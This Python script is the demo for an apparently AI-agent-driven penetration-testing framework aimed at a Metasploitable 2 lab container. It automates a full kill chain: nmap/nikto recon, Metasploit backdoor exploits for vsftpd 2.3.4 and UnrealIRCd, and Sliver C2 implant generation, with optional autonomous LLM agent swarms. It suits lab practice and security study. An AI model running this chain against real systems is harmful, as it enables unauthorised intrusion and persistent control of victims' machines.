#!/usr/bin/env python3
"""
PHALANX v3.3 – Demo against Metasploitable 2.
Supports both linear/agentic demo and new /swarm demo (CTF mode).

Enhanced with:
- Shadow Graph support for swarm demo (--graph flag)
- Looped harness support for persistent reasoning (--loop flag)
- Hierarchical swarm spawning enabled by default in swarm demo
- Consistent file paths (./phalanx/ instead of ~/.phalanx)
- Robust error handling in all execution paths
- Fixed: generate_engagement_plan now works safely in all contexts
- Fixed: async event loop handling in run_swarm_demo
"""

import json
import time
import asyncio
import sys
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional
from concurrent.futures import ThreadPoolExecutor

from phalanx_core import PhalanxDB, Soul, SkillManager
from phalanx_library import generate_engagement_plan  # Now async-safe
from phalanx_tools import Gateway, TOOL_REGISTRY
from phalanx_engine import ToolExecutor

# Import swarm components (if available)
try:
    from phalanx_library import SwarmOrchestrator, list_ollama_models, pull_ollama_model, run_swarm
    SWARM_AVAILABLE = True
except ImportError:
    SWARM_AVAILABLE = False

# ------------------------------------------------------------------
# Paths – consistent with rest of PHALANX (local ./phalanx)
# ------------------------------------------------------------------
BASE_DIR = Path.cwd() / "phalanx"
REPORTS_DIR = BASE_DIR / "reports"
SWARM_CAMPAIGNS_FILE = BASE_DIR / "swarm_campaigns.json"

def _ensure_dirs():
    REPORTS_DIR.mkdir(parents=True, exist_ok=True)

# ------------------------------------------------------------------
# Linear/agentic demo (kept as is, but fixed alias)
# ------------------------------------------------------------------
def run_demo(config: dict, soul: Soul, skill_mgr: SkillManager,
             db: PhalanxDB, executor: ToolExecutor, gateway: Gateway) -> dict:
    """
    Full autonomous demo – planning, recon, exploit, C2, reporting.
    Uses dynamic vulnerability detection instead of hardcoded vsftpd.
    """
    target = config.get("demo_target", "metasploitable2")  # Docker hostname
    print(f"[*] Starting PHALANX demo against {target}")

    # 1. Planning – generate_engagement_plan is now async-safe
    print("[Phase 1] Generating OPPLAN...")
    plan = generate_engagement_plan(target, "Full kill chain demo", gateway)
    session_id = None
    sessions = db.list_sessions(1)
    if not sessions:
        db.create_session(target, "demo", ["plan", "recon", "exploit", "c2"])
        sessions = db.list_sessions(1)
    if sessions:
        session_id = sessions[0]["session_id"]
        for obj in plan.get("objectives", []):
            db.add_objective(session_id, obj["description"], obj.get("mitre_tags", []))

    # 2. Reconnaissance
    print("[Phase 2] Reconnaissance...")
    recon_tools = ["nmap", "nikto", "whatweb"]
    recon_results = {}
    for tool in recon_tools:
        print(f"  Running {tool}...")
        if tool == "nmap":
            res = gateway.run_tool(tool, {"target": target, "options": "-sV -p- --open"})
        else:
            res = gateway.run_tool(tool, {"target": target})
        recon_results[tool] = res
        if session_id and res.get("rc", -1) == 0:
            db.add_finding(target, tool, "info", f"Recon output from {tool}", res.get("output", "")[:500])

    # 3. Exploitation – dynamic detection
    print("[Phase 3] Exploitation...")
    nmap_output = recon_results.get("nmap", {}).get("output", "")
    exploits = []

    # Check for known vulnerable services
    if "vsftpd 2.3.4" in nmap_output:
        print("  vsftpd 2.3.4 detected – launching exploit")
        res = gateway.run_tool("msfconsole", {"resource": "exploit/unix/ftp/vsftpd_234_backdoor"})
        exploits.append({
            "name": "vsftpd_234_backdoor",
            "tool": "msfconsole",
            "success": res.get("rc", -1) == 0,
            "output": res.get("output", "")[:500]
        })
    elif "UnrealIRCd" in nmap_output:
        print("  UnrealIRCd backdoor detected – launching exploit")
        res = gateway.run_tool("msfconsole", {"resource": "exploit/unix/irc/unreal_ircd_3281_backdoor"})
        exploits.append({
            "name": "unreal_ircd_backdoor",
            "tool": "msfconsole",
            "success": res.get("rc", -1) == 0,
            "output": res.get("output", "")[:500]
        })
    else:
        print("  No known vulnerable service found – skipping exploit")

    # 4. C2 deployment (simulated)
    print("[Phase 4] C2 deployment...")
    c2_result = {}
    try:
        res = gateway.run_tool("sliver_generate", {"target_ip": target, "mtls_port": 443})
        if res.get("rc", -1) == 0:
            print("  Sliver implant generated successfully")
            c2_result = {"status": "success", "output": res.get("output", "")[:200]}
        else:
            c2_result = {"status": "failed", "error": res.get("error", "Unknown error")}
    except Exception as e:
        c2_result = {"status": "failed", "error": str(e)}

    # 5. Reporting
    print("[Phase 5] Generating report...")
    report = {
        "target": target,
        "timestamp": datetime.utcnow().isoformat(),
        "plan": plan,
        "recon_summary": {k: v.get("rc", -1) for k, v in recon_results.items()},
        "exploits": exploits,
        "c2": c2_result,
        "findings_count": len(db.get_findings(1000)) if session_id else 0
    }
    _ensure_dirs()
    report_path = REPORTS_DIR / f"demo_{target}_{int(time.time())}.json"
    report_path.write_text(json.dumps(report, indent=2))
    print(f"[+] Demo report saved to {report_path}")

    if session_id:
        db.finish_session(session_id, "completed")
    return report

# ------------------------------------------------------------------
# Swarm-based demo (CTF mode against Metasploitable 2)
# ------------------------------------------------------------------
def run_swarm_demo(config: dict, soul: Soul, skill_mgr: SkillManager,
                   db: PhalanxDB, executor: ToolExecutor, gateway: Gateway,
                   enable_shadow_graph: bool = False, enable_looped: bool = False) -> dict:
    """
    Run a swarm demo against the local Metasploitable 2 container.
    Uses the /swarm infrastructure with 4 agents + orchestrator, CTF mode.
    
    Args:
        enable_shadow_graph: If True, persist relationships and loot to graph DB.
        enable_looped: If True, start the looped transformer harness in background.
    """
    if not SWARM_AVAILABLE:
        print("[!] Swarm components not available. Run 'python phalanx_extra.py --force' first.")
        return {"error": "Swarm not available"}

    target = config.get("demo_target", "metasploitable2")
    print(f"[*] Starting SWARM demo against {target} (CTF mode)")
    if enable_shadow_graph:
        print("    Shadow Graph ENABLED – tracking relationships and loot")
    if enable_looped:
        print("    Looped Harness ENABLED – background recurrent-depth reasoning")

    # Ensure Ollama and model are ready
    model = config.get("swarm", {}).get("default_model", "qwen2.5:0.5b")
    models_local = list_ollama_models()
    if model not in models_local:
        print(f"[*] Pulling model {model}...")
        if not pull_ollama_model(model):
            print(f"[!] Failed to pull {model}. Using fallback.")
            model = "qwen2.5:0.5b"

    # Create a campaign record
    campaign_id = f"swarm_demo_{int(time.time())}"
    try:
        db.create_swarm_campaign(campaign_id, target, scope=target, mode="ctf", model_used=model)
    except AttributeError:
        # Fallback: store in file (consistent with ./phalanx)
        _ensure_dirs()
        campaigns = {}
        if SWARM_CAMPAIGNS_FILE.exists():
            campaigns = json.loads(SWARM_CAMPAIGNS_FILE.read_text())
        campaigns[campaign_id] = {
            "target": target,
            "scope": target,
            "mode": "ctf",
            "model": model,
            "status": "running",
            "started_at": datetime.utcnow().isoformat()
        }
        SWARM_CAMPAIGNS_FILE.write_text(json.dumps(campaigns, indent=2))

    print(f"[*] Swarm campaign ID: {campaign_id}")

    # Define progress callback for live output
    def progress_cb(msg: str):
        print(f"  [swarm] {msg}")

    # Start looped harness if requested (background thread)
    looped_harness = None
    if enable_looped:
        # Attempt to get looped harness from soul or create new
        if hasattr(soul, 'looped_harness') and soul.looped_harness:
            looped_harness = soul.looped_harness
            looped_harness.start(target)
            print("[*] Looped harness started in background")
        else:
            print("[!] Looped harness requested but not available – skipping")

    result = None
    try:
        # Pass the existing db, soul, etc. to reuse them
        # run_swarm handles async context safely (using ThreadPoolExecutor if needed)
        result = run_swarm(
            target=target,
            scope=target,
            mode="ctf",
            model=model,
            follow=True,
            progress_callback=progress_cb,
            db=db,
            soul=soul,
            skill_mgr=skill_mgr,
            gateway=gateway,
            enable_hierarchical=True,
            enable_shadow_graph=enable_shadow_graph
        )
        # result is the final context dict from orchestrator
        final_report = result.get("report", result.get("final_report", {}))
        if not final_report and "report" in result:
            final_report = result["report"]
        elif not final_report:
            final_report = {
                "recon_findings": result.get("recon_findings", {}),
                "validated_vulnerabilities": result.get("validated_vulnerabilities", []),
                "exploit_plan": result.get("exploit_plan", [])
            }

        # Save final report
        report_data = {
            "target": target,
            "campaign_id": campaign_id,
            "mode": "ctf",
            "timestamp": datetime.utcnow().isoformat(),
            "shadow_graph_enabled": enable_shadow_graph,
            "looped_harness_enabled": enable_looped,
            "recon_findings": result.get("recon_findings", {}),
            "validated_vulnerabilities": result.get("validated_vulnerabilities", []),
            "exploit_plan": result.get("exploit_plan", [])
        }
        _ensure_dirs()
        report_path = REPORTS_DIR / f"swarm_demo_{campaign_id}.json"
        report_path.write_text(json.dumps(report_data, indent=2))
        print(f"[+] Swarm demo report saved to {report_path}")

        # Update campaign status
        try:
            db.update_swarm_campaign(campaign_id, "completed", str(report_path))
        except AttributeError:
            pass

    except Exception as e:
        print(f"[!] Swarm demo failed: {e}")
        # Return a partial report with error information
        return {
            "error": str(e),
            "campaign_id": campaign_id,
            "partial": result if result else None
        }
    finally:
        # Safely stop looped harness if it exists and has a stop method
        if looped_harness is not None and hasattr(looped_harness, 'stop'):
            looped_harness.stop()
            print("[*] Looped harness stopped")

    return report_data

# ------------------------------------------------------------------
# CLI entry point for demo (supports --swarm, --graph, --loop flags)
# ------------------------------------------------------------------
if __name__ == "__main__":
    import argparse
    from phalanx_library import bootstrap_all

    parser = argparse.ArgumentParser(description="PHALANX Demo")
    parser.add_argument("--swarm", action="store_true", help="Use swarm mode (CTF)")
    parser.add_argument("--graph", "--shadow", action="store_true", help="Enable Shadow Graph persistence in swarm demo")
    parser.add_argument("--loop", action="store_true", help="Enable Looped Transformer harness (background reasoning)")
    parser.add_argument("--config", default="config.json", help="Config file path")
    args = parser.parse_args()

    # Load config
    config_path = Path(args.config)
    if config_path.exists():
        config = json.loads(config_path.read_text())
    else:
        config = {
            "demo_target": "metasploitable2",
            "sandbox": {"enabled": False},
            "ollama": {"url": "http://localhost:11434", "default_model": "qwen2.5:7b"},
            "swarm": {"default_model": "qwen2.5:0.5b"},
            "looped": {"enabled": True}
        }

    # Bootstrap core components (returns soul, skill_mgr, db, auto_pentest, looped_harness)
    soul, skill_mgr, db, _, looped_harness = bootstrap_all(config)
    gateway = Gateway(config, TOOL_REGISTRY)
    executor = ToolExecutor(timeout=30, soul=soul, config=config)

    if args.swarm:
        report = run_swarm_demo(config, soul, skill_mgr, db, executor, gateway,
                                enable_shadow_graph=args.graph, enable_looped=args.loop)
    else:
        report = run_demo(config, soul, skill_mgr, db, executor, gateway)

    print(json.dumps(report, indent=2))
    db.close()
